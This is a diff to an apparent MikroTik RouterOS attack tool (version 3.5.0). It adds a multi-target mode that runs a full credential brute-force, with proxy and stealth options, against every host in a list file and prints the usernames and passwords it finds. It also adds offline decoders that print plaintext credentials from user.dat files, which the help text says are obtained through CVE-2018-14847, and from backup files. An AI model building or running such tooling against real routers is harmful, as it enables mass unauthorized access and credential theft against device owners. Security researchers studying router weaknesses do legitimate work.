@@ -87,7 +87,7 @@ MikrotikFingerprinter = _mods["MikrotikFingerprinter"]
 SmartWordlistManager  = _mods["SmartWordlistManager"]
 ProxyManager          = _mods["ProxyManager"]
 
-_VERSION = "3.4.0"
+_VERSION = "3.5.0"
 
 # ── Telnet fallback (removed from stdlib in Python 3.13) ─────────────────
 
@@ -975,6 +975,53 @@ def _build_parser() -> argparse.ArgumentParser:
     feat.add_argument("--interactive",   action="store_true", help="Start interactive REPL")
     feat.add_argument("--max-retries",   type=int, default=1, help="Connection retry count (default: 1)")
 
+    # Multi-target (v3.5.0+) — from alina0x fork analysis
+    mt = p.add_argument_group(
+        "Multi-Target",
+        "Scan multiple hosts sequentially from a target file.",
+    )
+    mt.add_argument(
+        "-T", "--target-list",
+        metavar="FILE",
+        help="File with one target IP/hostname per line. Runs the full attack against each.",
+    )
+
+    # Offline credential decoders (v3.5.0+) — based on mikrotik-tools by Kirils Solovjovs
+    dec = p.add_argument_group(
+        "Offline Decoders (mikrotik-tools integration)",
+        "Decode RouterOS proprietary files obtained through exploitation (no network required).",
+    )
+    dec.add_argument(
+        "--decode-userdat",
+        metavar="USER.DAT",
+        help="Decode a RouterOS user.dat file and print plaintext credentials. "
+             "Use together with --decode-useridx for best results. "
+             "Obtained via CVE-2018-14847 (user.dat) or .backup extraction.",
+    )
+    dec.add_argument(
+        "--decode-useridx",
+        metavar="USER.IDX",
+        default=None,
+        help="Optional companion user.idx file for --decode-userdat.",
+    )
+    dec.add_argument(
+        "--decode-backup",
+        metavar="BACKUP.BACKUP",
+        help="Extract and decode credentials from a RouterOS .backup file. "
+             "Unencrypted backups only.",
+    )
+    dec.add_argument(
+        "--analyze-npk",
+        metavar="PKG.NPK",
+        help="Analyze a RouterOS NPK package file (parts, signature, digest, "
+             "install script, CVE-2019-3977 indicators).",
+    )
+    dec.add_argument(
+        "--decode-supout",
+        metavar="SUPOUT.RIF",
+        help="List sections in a RouterOS supout.rif diagnostic file.",
+    )
+
     # MAC Server / Layer-2 features (v3.3.0+)
     l2 = p.add_argument_group(
         "MAC Server / Layer-2 (v3.3.0+)",
@@ -1424,6 +1471,69 @@ def main() -> None:
         cli.start()
         sys.exit(0)
 
+    # ── Offline decoder modes (v3.5.0+) ──────────────────────────
+    _decode_userdat = getattr(args, "decode_userdat", None)
+    _decode_useridx = getattr(args, "decode_useridx", None)
+    _decode_backup  = getattr(args, "decode_backup",  None)
+    _analyze_npk    = getattr(args, "analyze_npk",    None)
+    _decode_supout  = getattr(args, "decode_supout",  None)
+
+    if _decode_userdat:
+        try:
+            from modules.decoder import UserDatDecoder
+            print(f"\n  [decoder] Decoding user.dat: {_decode_userdat}")
+            users = UserDatDecoder.from_files(_decode_userdat, _decode_useridx)
+            UserDatDecoder.print_table(users)
+        except Exception as _de:
+            print(f"\n  [decoder] Error: {_de}\n")
+        sys.exit(0)
+
+    if _decode_backup:
+        try:
+            from modules.decoder import BackupDecoder
+            print(f"\n  [decoder] Extracting credentials from backup: {_decode_backup}")
+            users = BackupDecoder.extract_credentials(_decode_backup)
+            if users:
+                from modules.decoder import UserDatDecoder
+                UserDatDecoder.print_table(users)
+            else:
+                print("  No credentials found in backup.\n")
+        except Exception as _be:
+            print(f"\n  [decoder] Error: {_be}\n")
+        sys.exit(0)
+
+    if _analyze_npk:
+        try:
+            from xpl.npk_decoder import NPKParser, NPKSecurityAnalyzer
+            parser = NPKParser(_analyze_npk)
+            parser.print_summary()
+            result = NPKSecurityAnalyzer.check_cve_2019_3977(_analyze_npk)
+            vuln = result.get("vulnerable", False)
+            print(f"  CVE-2019-3977 risk: {'HIGH — suspicious NPK characteristics' if vuln else 'Low — no obvious tampering indicators'}")
+            print(f"  Evidence: {result.get('evidence', '')}\n")
+        except Exception as _ne:
+            print(f"\n  [npk] Error: {_ne}\n")
+        sys.exit(0)
+
+    if _decode_supout:
+        try:
+            from modules.decoder import SupoutDecoder
+            print(f"\n  [supout] Listing sections in: {_decode_supout}")
+            sections = SupoutDecoder.list_sections(_decode_supout)
+            if sections:
+                print(f"  {'Section name':45}  {'Size':10}  {'Offset'}")
+                print("  " + "-" * 70)
+                for s in sections:
+                    print(f"  {s['name'][:45]:45}  {s['size']:10,}  {s['offset']}")
+            else:
+                print("  No sections found — may not be a valid supout.rif")
+            users = SupoutDecoder.extract_users_from_supout(_decode_supout)
+            if users:
+                print(f"\n  Users found in supout: {[u['username'] for u in users]}\n")
+        except Exception as _se:
+            print(f"\n  [supout] Error: {_se}\n")
+        sys.exit(0)
+
     # ── MAC Server / Layer-2 modes (v3.3.0+) ─────────────────────────
     mac_discover = getattr(args, "mac_discover", False)
     mac_brute    = getattr(args, "mac_brute",    False)
@@ -1520,6 +1630,67 @@ def main() -> None:
             export_dir=getattr(args, "export_dir", "results"),
             http_port=getattr(args, "http_port", 80) or 80,
         )
+        sys.exit(0)
+
+    # ── Multi-target mode (v3.5.0+) ────────────────────────────────
+    _target_list_file = getattr(args, "target_list", None)
+    if _target_list_file:
+        try:
+            with open(_target_list_file) as _tf:
+                targets_from_file = [l.strip() for l in _tf if l.strip() and not l.startswith("#")]
+        except OSError as _tfe:
+            print(f"\n  [multi-target] Cannot read target list: {_tfe}\n")
+            sys.exit(1)
+
+        print(f"\n  [multi-target] Loaded {len(targets_from_file)} target(s) from {_target_list_file}")
+        _all_mt_results: List[Dict] = []
+
+        for _tgt in targets_from_file:
+            print(f"\n{'='*60}\n  Target: {_tgt}\n{'='*60}")
+            _log_mt = Log(verbose=args.verbose, verbose_all=args.verbose_all)
+            _svc = _scan_services(_tgt, args.api_port, args.http_port, args.ssl_port, args.ssl)
+            if not any(_svc.values()):
+                _log_mt.warning("[!] %s — no open Mikrotik ports, skipping.", _tgt)
+                continue
+            _eng = BruteforceEngine(
+                target=_tgt,
+                usernames=args.userlist if args.userlist else args.user,
+                passwords=args.passlist if args.passlist else args.passw,
+                combo_dict=args.dictionary,
+                delay=args.seconds,
+                api_port=args.api_port,
+                rest_port=args.rest_port,
+                http_port=args.http_port,
+                ssl_port=args.ssl_port,
+                use_ssl=args.ssl,
+                max_workers=args.threads,
+                verbose=args.verbose,
+                verbose_all=args.verbose_all,
+                validate_services=_parse_validate(args.validate),
+                services_ok=_svc,
+                show_progress=args.progress,
+                proxy_url=args.proxy,
+                export_formats=[],
+                export_dir=args.export_dir,
+                max_retries=args.max_retries,
+                stealth_mode=args.stealth,
+                fingerprint=args.fingerprint,
+            )
+            try:
+                _res = _eng.run()
+                _all_mt_results.extend(_res)
+            except KeyboardInterrupt:
+                print(f"\n  [multi-target] Interrupted at {_tgt}")
+                break
+            except Exception as _exc:
+                print(f"  [multi-target] Error on {_tgt}: {_exc}")
+
+        if _all_mt_results:
+            print(f"\n  [multi-target] *** {len(_all_mt_results)} credential(s) found ***")
+            for _r in _all_mt_results:
+                print(f"    {_r.get('target','')}  {_r.get('username','')} / {_r.get('password','')}")
+        else:
+            print(f"\n  [multi-target] No credentials found.\n")
         sys.exit(0)
 
     # ── Target required for all other modes ───────────────────────────
